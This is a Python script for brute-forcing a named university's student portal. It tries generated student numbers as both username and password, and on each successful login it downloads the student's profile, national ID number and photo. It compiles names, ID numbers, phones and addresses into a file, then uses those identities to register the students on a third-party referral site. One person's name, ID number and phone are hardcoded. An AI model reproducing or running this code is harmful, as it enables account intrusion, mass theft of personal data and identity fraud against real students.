import re
import os
import requests
from urllib import quote
from multiprocessing import Pool

PROXY = {'http': '127.0.0.1:9090'}

ROOT = "http://zsjy.nuc.edu.cn/jygl"

data = "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUJMTY1MDIyOTA5D2QWAgIBD2QWAgILDxAPFgYeDURhdGFUZXh0RmllbGQFBG5hbWUeDkRhdGFWYWx1ZUZpZWxkBQRuYW1lHgtfIURhdGFCb3VuZGdkEBUBBDIwMTYVAQQyMDE2FCsDAWcWAWZkZH%2F5UXfTfAOEBdj91hVhiJrC1ZAeLShSVhI%2Fyjy41GQn&__VIEWSTATEGENERATOR=CBED83C2&__EVENTVALIDATION=%2FwEWCgLQ99qNBwL5zfOuDAL8zY%2BNDgLZzfWQDgKPzYGRDgKNzYGRDgKOzYGRDgKMzYGRDgKlxrLyDgLvybudAbz7UGXyjiZtvkoq7UDbeh1EMG%2FaUu6fRFdEcjkf7erA&TB_yhm={0}&TB_mm={1}&DDL_sf=xs&DDL_bynf=2016&BT_dl=%B5%C7+%C2%BC"

header = {'Content-Type': 'application/x-www-form-urlencoded'}

grxx = '/xuesheng/xggrxx.aspx'
tjb = '/xuesheng/tjb.aspx'
photo = '/xuesheng/xs_photo.aspx'
index = '/index.aspx'

root = "e:/jee/"

def gen_xuehao(xueyuan=None, zhuanye=None, banji=None, xuehao=None):
    xueyuan =  xueyuan or range(1,13)
    zhuanye = zhuanye or range(1,7)
    banji = banji or range(1,4)
    xuehao = xuehao or range(1,41)

    for x in xueyuan:
        for z in zhuanye:
            for b in banji:
                for h in xuehao:
                    yield "12%02d%02d4%d%02d" % (x,z,b,h)

def g():
    s = requests.session()
    form = data.format(1206064226, "88888")
    r = s.post(ROOT+index, data=form, headers=header)
    if(len(r.content) == 4499):
       return s
       

#def main(xuehao_generator=None):
def m(xueyuan):
    i = 0;
    xuehaos = gen_xuehao(range(xueyuan,xueyuan+1))
    #xuehaos = xuehao_generator or gen_xuehao()
    for xuehao in xuehaos:
        form = data.format(xuehao, xuehao)
        s = requests.session();
        try:
            r = s.post(ROOT+index, data=form, headers=header)
        except:
            next
        if len(r.content) == 4499:
            i += 1
            get_name(s, xuehao)
            get_idNum(s, xuehao)
            get_photo(s,xuehao)
      #  else:
      #      print "lose " + xuehao
    print "get " + i
      

def get_name(s,xuehao):
    try:
        with open(root + str(xuehao) +"_name.html", "w") as f:
            r = s.get(ROOT+tjb)
            if r:
                f.write(r.content)
    except:
        pass

def get_idNum(s,xuehao):
    try:
        with open(root + str(xuehao) +"_ID.html", "w") as f:
            r = s.get(ROOT+grxx)
            if r:
                f.write(r.content)
    except:
        pass

def get_photo(s, xuehao):
    try:
        url = get_photo_url(s)
        img_data = s.get(url).content
        f = open(root + str(xuehao) + '.png',"wb")
        f.write(img_data)
    except:
        pass
    

def get_photo_url(s):
    r = s.get(ROOT+photo)
    if r:
        url = re.findall(r'<img src="(.*?)"', r.content)
        return "http://zsjy.nuc.edu.cn" + url[0]
    else:
        raise


def mult_do():
    p = Pool(12)
    #generators = [ gen_xuehao((i,i+1)) for i in range(1,13)]
    p.map(main, range(1,13))


def get_ID(file_name):
    #f = open("E:/jee/1201014101_ID.html")
    f = open(file_name)
    s = f.read()
    f.close()
    p = r'name="TB_sfzh".*?value="(\d*)"'
    id_num = re.findall(p, s)[0]
    return id_num

def get_inform(file_name):
    f = open(file_name)
    s = f.read()
    f.close()
    inform = ["TB_xm", "TB_xb","TB_mz","TB_csny",
              "TB_sg","TB_tz","TB_zy","TB_dzxx","TB_sjhm","TB_lxdz"]
    result = []
    #table = re.findall(r'<TABLE.*?>(.*?)</TABLE>', s, re.S)[1]
    for i in inform:
        result.append(re.findall('name="'+ i + '".*?value="(.*?)"', s, re.S)[0])
    return result



def main():
    files = os.listdir(root)
    ids = filter(lambda f: f.endswith('ID.html'), files)

    f = open(root+"sumary.txt","w")
    for i in ids:
        try:
            id_num = get_ID(root+i)
            xuehao = i.split('_')[0]
            inform = get_inform(root+xuehao + '_name.html')
        except:
            next
        inform.insert(3,xuehao)
        inform.insert(3,id_num)
        f.write('    '.join(inform))
        f.write('\r\n')
    f.close()
    
    
##打开验证码图片
        
##>>> from PIL import Image                                                                                
##>>> img = Image.open('test.png')
##>>> img.show()
        
##或者   在Windows下
##import os
##os.system('start pic.png')
        
##或者
##>>> import webbrowser
##>>> webbrowser.open("C:/1.jpg")

## Example:
        
##>>> from PIL import Image
##>>> import requests
##>>> import cStringIO
##>>> url = "http://www.youku.com/user_captcha?t=1443003776660"
##
##>>> r = requests(url)
##
##>>> imgf = cStringIO.StringIO(r.content)
##>>> img = Image.open(imgf)
##>>> img.show()


def rs(name):
	return quote(name.decode("gb2312").encode('utf8'))


def DES(massage, key):
    key = '!thfund*2015@'
    pass

'''\
GET /student/add.do?type=1&collegeCode=qtdx
&collegeName=%E4%B8%AD%E5%8C%97%E5%A4%A7%E5%AD%A6
&name=%E7%99%BD%E7%8E%B2%E7%8E%B2       //姓名 使用上面rs函数
&idno=t1KMJ0zyF89v6IEnEpULzYzRarjA9wlM  //身份证 需要用DES加密，
&mobile=18335161737
&aliPayId=18335161737
&kaptcha=9246     //验证码，http://jxf.baofen.cn/kaptcha/getKaptchaImage.do?keyCode=???`
&keyCode=0.5555120187345891  //随机生成
&invCode=2y4xruzldcvw
&t=0.9435517007950693   //未知，好像没影响
HTTP/1.1

Host: jxf.baofen.cn
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mzilla/5.0 Mobile
Referer: http://jxf.baofen.cn/?channelid=weixin&c=2y4xruzldcvw
Accept-Encoding: gzip, deflate, sdch
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4

成功条件 json.retCode == "000000"
'''
url = 'http://jxf.baofen.cn/student/add.do'
params = {
    'type': 1,
    'collegeCode': 'qtdx',
    'collegeName': '%E4%B8%AD%E5%8C%97%E5%A4%A7%E5%AD%A6',
    'name': '',
    'idno': '',
    'mobile': '',
    'aliPayId': '',
    'kaptcha': '',
    'keyCode': '',
    'invCode':'2y4xruzldcvw',
    't': '0.9435517007950693'
    }


f_name = '仇爽男'
f_id = '210281199402016419'
f_des = 'c8w1fj66D4IlC6xEP3sxc%2BZc88UJf%2Bwv'
f_mobile = f_alid = '18335161516'

params['name'] = quote(f_name)
params['idno'] = f_des
params['mobile'] = f_mobile
params['aliPayId'] = f_alid
params['keyCode'] = '0.5555120187345892'
params['kaptcha'] = '2014'


header = {
    'Host': 'jxf.baofen.cn',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mzilla/5.0 Mobile',
    'Referer': 'http://jxf.baofen.cn/?channelid=weixin&c=2y4xruzldcvw',
    'Accept-Encoding': 'gzip, deflate, sdch',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
     }

prefix = '?type=1&collegeCode=qtdx&collegeName=%E4%B8%AD%E5%8C%97%E5%A4%A7%E5%AD%A6'
t_name = '&name={0}'
t_id = '&idno={0}'
t_mobile = '&mobile={0}'
t_alid = '&aliPayId={0}'
t_kapt = '&kaptcha={0}'
end = '&keyCode=0.5555120187345892&invCode=2y4xruzldcvw&t=0.9435517007950693'
#url = 'http://jxf.baofen.cn/student/add.do?type=1&collegeCode=qtdx&collegeName=%E4%B8%AD%E5%8C%97%E5%A4%A7%E5%AD%A6&name=%s&idno=%s&mobile=%s&aliPayId=%s&kaptcha=%s&keyCode=%s&invCode=2y4xruzldcvw&t=0.9435517007950693'

f_url = url + prefix + t_name.format(quote(f_name)) + t_id.format(f_des) +\
        t_mobile.format(f_mobile) + t_alid.format(f_alid) +\
        t_kapt.format(3223)+ end


def gen_inform():
    try:         
        f = open(root+'sumary.txt')
        for line in f.readlines():
            parts = line.split()
            yield [rs(parts[0]), parts[3] ,parts[10]]
    except:
        pass
    finally:
        print 'file salely closed'
        f.close()
                   

